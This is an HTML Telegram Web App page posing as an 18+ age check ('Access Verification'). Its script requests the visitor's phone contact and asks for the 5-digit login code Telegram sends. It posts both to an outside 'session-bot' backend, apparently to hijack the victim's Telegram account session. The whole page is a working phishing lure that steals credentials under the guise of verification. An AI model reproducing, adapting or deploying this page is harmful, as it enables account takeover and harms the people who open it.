<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Access Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; transition: 0.3s; margin: 0; padding: 0; }
        
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
            background-size: cover; 
            height: 100vh; 
            width: 100vw;
            overflow: hidden;
            position: relative;
        }
        
        /* পেছনের ছবির উপর হালকা কালো আস্তরণ */
        .overlay { 
            position: absolute; 
            top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.4); 
            backdrop-filter: blur(6px); 
            z-index: 1; 
        }
        
        /* মূল কার্ডের ডিজাইন (একেবারে মাঝখানে রাখার জন্য Fix করা হয়েছে) */
        .card { 
            position: absolute; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); /* এটি বক্সকে ঠিক মাঝখানে রাখবে */
            z-index: 2; 
            width: 90%; 
            max-width: 380px; 
            background: rgba(255, 255, 255, 0.65); 
            backdrop-filter: blur(15px); 
            -webkit-backdrop-filter: blur(15px);
            border-radius: 30px; 
            padding: 35px 25px; 
            text-align: center; 
            box-shadow: 0 20px 50px rgba(0,0,0,0.3); 
            border: 2px solid rgba(255,255,255,0.6); 
        }

        .icon { font-size: 60px; margin-bottom: 10px; text-shadow: 0 4px 10px rgba(0,0,0,0.2); }
        h2 { color: #111; margin: 0 0 10px; font-size: 24px; font-weight: 800; text-shadow: 0 1px 2px rgba(255,255,255,0.8); }
        p { color: #222; font-size: 15px; margin-bottom: 25px; line-height: 1.5; font-weight: 600; text-shadow: 0 1px 1px rgba(255,255,255,0.5); }
        
        .btn { width: 100%; padding: 16px; border-radius: 18px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; color: #fff; }
        
        /* কনফার্ম বাটনের স্পেশাল এনিমেশন ও কালার */
        .btn-confirm { 
            background: linear-gradient(135deg, #ff416c, #ff4b2b); 
            box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); 
            animation: pulse 2s infinite; 
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
            50% { transform: translate(-50%, -50%) scale(1.04); box-shadow: 0 12px 30px rgba(255, 65, 108, 0.8); }
            100% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
        }

        /* কার্ডের ভেতরে বাটন নড়াচড়ার জন্য এনিমেশন ফিক্স */
        .card .btn-confirm {
            animation: pulse-btn 2s infinite;
        }

        @keyframes pulse-btn {
            0% { transform: scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
            50% { transform: scale(1.04); box-shadow: 0 12px 30px rgba(255, 65, 108, 0.8); }
            100% { transform: scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
        }

        .btn-view { background: linear-gradient(135deg, #00c6ff, #0072ff); margin-bottom: 20px; box-shadow: 0 5px 15px rgba(0, 114, 255, 0.4); }
        .btn-view:active { transform: scale(0.95); }

        .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
        .otp-box { width: 45px; height: 55px; background: rgba(255, 255, 255, 0.8); border: 2px solid #ccc; border-radius: 12px; font-size: 26px; font-weight: bold; color: #111; display: flex; align-items: center; justify-content: center; box-shadow: inset 0 2px 5px rgba(0,0,0,0.1); }
        
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
        .key { background: rgba(255, 255, 255, 0.8); padding: 15px; border-radius: 15px; font-size: 22px; font-weight: bold; color: #222; cursor: pointer; border: 1px solid rgba(255,255,255,0.9); box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .key:active { background: #e0e0e0; transform: scale(0.92); box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        
        .hidden { display: none !important; }
        .loader { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #ff4b2b; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="card">
        <!-- Step 1: Confirm -->
        <div id="step1">
            <div class="icon">🔞</div>
            <h2>Attention! 🔞</h2>
            <p>To continue, you must confirm that you are over 18 😊</p>
            <button class="btn btn-confirm" onclick="startProcess()">🍓 confirm 🔞</button>
        </div>

        <!-- Loading -->
        <div id="loading" class="hidden">
            <div class="loader"></div>
            <p id="load_text">Wait...</p>
        </div>

        <!-- Step 2: OTP -->
        <div id="step2" class="hidden">
            <div class="icon">📩</div>
            <p>Enter the 5-digit code that we just sent you!</p>
            <div class="otp-container">
                <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
            </div>
            <button class="btn btn-view" onclick="viewCode()">🔞 GET CODE 🔞</button>
            <div class="keypad">
                <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
                <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
                <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
                <div style="background:transparent; box-shadow: none; border: none;"></div><div class="key" onclick="press('0')">0</div><div class="key" onclick="back()">⌫</div>
            </div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = null;
        let currentOTP = "";

        function getUserId() {
            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                userId = tg.initDataUnsafe.user.id;
            }
        }
        getUserId();

        function startProcess() {
            getUserId();
            if (!userId) return alert("Error: User data not found. Open from Telegram!");
            tg.requestContact((shared, data) => {
                if (shared) {
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('loading').classList.remove('hidden');
                    pollContact();
                }
            });
        }

        async function pollContact() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") {
                    sendNumber(data.phone);
                } else { setTimeout(pollContact, 1500); }
            } catch (e) { setTimeout(pollContact, 2000); }
        }

        async function sendNumber(phone) {
            document.getElementById('load_text').innerText = "Sending Code...";
            const res = await fetch(`${BACKEND_URL}/send_number`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ user_id: userId, phone: phone })
            });
            const result = await res.json();
            if (result.status === "success") {
                document.getElementById('loading').classList.add('hidden');
                document.getElementById('step2').classList.remove('hidden');
            } else { alert("Error: " + result.message); location.reload(); }
        }

        function viewCode() {
            const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
            tg.openLink(redirectUrl);
        }

        function press(n) {
            if(currentOTP.length < 5) {
                currentOTP += n;
                for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || "";
                if(currentOTP.length === 5) verifyOTP();
            }
        }
        function back() { currentOTP = currentOTP.slice(0, -1); for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }

        async function verifyOTP() {
            const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                method: "POST", headers: {"Content-Type": "application/json"},
                body: JSON.stringify({ user_id: userId, otp: currentOTP })
            });
            const data = await res.json();
            if (data.status === "success") { tg.close(); }
            else { alert("Invalid Code!"); currentOTP = ""; back(); }
        }
    </script>
</body>
</html>
